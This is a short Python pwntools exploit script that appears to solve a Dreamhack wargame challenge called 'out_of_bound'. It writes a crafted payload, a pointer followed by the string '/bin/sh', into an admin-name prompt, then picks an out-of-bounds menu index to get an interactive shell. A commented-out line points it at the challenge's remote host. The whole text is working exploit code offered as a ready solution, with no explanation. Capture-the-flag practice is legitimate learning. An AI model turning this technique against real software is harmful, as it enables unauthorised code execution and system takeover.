#!/usr/bin/python3

from pwn import *

context.binary = exe = ELF('./out_of_bound',checksec=False)

# r= remote('host3.dreamhack.games',11101)
r = process(exe.path)
input()

payload = p32(0x0804a0b0) + b'/bin/sh\00'
r.sendafter(b'Admin name: ',payload)

r.sendlineafter(b'What do you want?: ',b'19')



r.interactive()